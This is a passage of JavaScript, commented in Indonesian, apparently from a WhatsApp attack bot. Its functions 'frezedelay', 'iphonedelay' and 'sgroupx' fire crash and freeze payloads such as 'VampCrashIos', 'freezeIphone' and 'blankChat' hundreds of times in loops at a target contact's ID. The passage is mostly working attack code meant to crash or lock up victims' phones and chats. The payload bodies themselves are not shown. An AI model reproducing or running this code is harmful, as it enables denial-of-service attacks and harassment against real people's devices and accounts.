    await safeExec("protocol8", () => protocol8(sock, jid, true));
    await delay(2000);
  }

  console.log(`FINISH superdelay to ${jid} oleh ${sock.user.id}`);
}

//frezedelay function
async function frezedelay(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING DEATH FLOW ${jid}`));

  for (let i = 1; i <= 900; i++) {
    if (!sock.user) break;

    console.log(chalk.red(`DEATH FLOW to ${jid}`));

    await safeExec("blankChat", () => blankChat(sock, jid));
    await safeExec("blankChat", () => blankChat(sock, jid));
    await safeExec("blankChat", () => blankChat(sock, jid));
    await safeExec("protocol8", () => protocol8(sock, jid, true));
    await safeExec("protocol8", () => protocol8(sock, jid, true));
    await safeExec("protocol8", () => protocol8(sock, jid, true));
    await delay(400);
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await safeExec("ChronosDelay", () => ChronosDelay(sock, jid, true)); 
    await safeExec("ChronosDelay", () => ChronosDelay(sock, jid, true)); 
    await safeExec("ChronosDelay", () => ChronosDelay(sock, jid, true));
    await delay(400);
    await safeExec("FreezePackk", () => FreezePackk(sock, jid)); 
    await safeExec("FreezePackk", () => FreezePackk(sock, jid)); 
    await safeExec("FreezePackk", () => FreezePackk(sock, jid)); 
    await safeExec("protocol7", () => protocol7(sock, jid, true));
    await safeExec("protocol7", () => protocol7(sock, jid, true));
    await safeExec("protocol7", () => protocol7(sock, jid, true));
    await delay(400);
    await safeExec("spay", () => spay(sock, jid)); 
    await safeExec("spay", () => spay(sock, jid)); 
    await safeExec("spay", () => spay(sock, jid)); 
    await safeExec("delayresponse", () => delayresponse(sock, jid)); 
    await safeExec("delayresponse", () => delayresponse(sock, jid)); 
    await safeExec("delayresponse", () => delayresponse(sock, jid)); 
    await delay(3000);
  }

  console.log(`Selesai frezedelay ke ${jid} oleh ${sock.user.id}`);
}

//iphonedelay funct
async function iphonedelay(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING iphonedelay to ${jid}`));

  for (let i = 1; i <= 1000; i++) {
    if (!sock.user) break;
    //READY TO KILL MONKEY !!!
    console.log(chalk.red(`Sending sgroupx to ${jid}`));
    await safeExec("VampCrashIos", () => VampCrashIos(sock, jid));
    await safeExec("VampCrashIos", () => VampCrashIos(sock, jid));
    await safeExec("VampCrashIos", () => VampCrashIos(sock, jid));
    await safeExec("freezeIphone", () => freezeIphone(sock, jid));
    await safeExec("freezeIphone", () => freezeIphone(sock, jid));
    await safeExec("freezeIphone", () => freezeIphone(sock, jid));
    await delay(400);
    await safeExec("VampiPhone", () => VampiPhone(sock, jid));
    await safeExec("VampiPhone", () => VampiPhone(sock, jid));
    await safeExec("VampiPhone", () => VampiPhone(sock, jid));
    await delay(400);
    await safeExec("VampDelayMess", () => VampDelayMess(sock, jid));
    await safeExec("VampDelayMess", () => VampDelayMess(sock, jid));
    await safeExec("VampDelayMess", () => VampDelayMess(sock, jid));
    await delay(400);
    await safeExec("VampCrashIos", () => VampCrashIos(sock, jid));
    await safeExec("VampCrashIos", () => VampCrashIos(sock, jid));
    await safeExec("VampCrashIos", () => VampCrashIos(sock, jid));
    await safeExec("freezeIphone", () => freezeIphone(sock, jid));
    await safeExec("freezeIphone", () => freezeIphone(sock, jid));
    await safeExec("freezeIphone", () => freezeIphone(sock, jid));
    await delay(2000);
  }

  console.log(`Selesai sgroupx ke ${jid} oleh ${sock.user.id}`);
}

//sgroupx funct
async function sgroupx(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");

  console.log(chalk.green(`STARTING sgroupx to ${jid}`));

  for (let i = 1; i <= 1000; i++) {
    if (!sock.user) break;
    //READY TO KILL MONKEY !!!
    console.log(chalk.red(`Sending sgroupx to ${jid}`));
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await delay(400);
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await delay(400);
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await delay(400);
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await safeExec("SnitchDelayVolteX", () => SnitchDelayVolteX(sock, jid));
    await delay(2000);
  }

  console.log(`Selesai sgroupx ke ${jid} oleh ${sock.user.id}`);
}

// Utility untuk eksekusi aman !! JANGAN DI HPS KALO GA NGERTI !!
async function safeExec(label, func) {
  try {
    await func();
  } catch (err) {
    console.error(`Error saat ${label}:`, err.message);
  }
}

// Delay helper !! JANGAN DI HAPUS !!
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}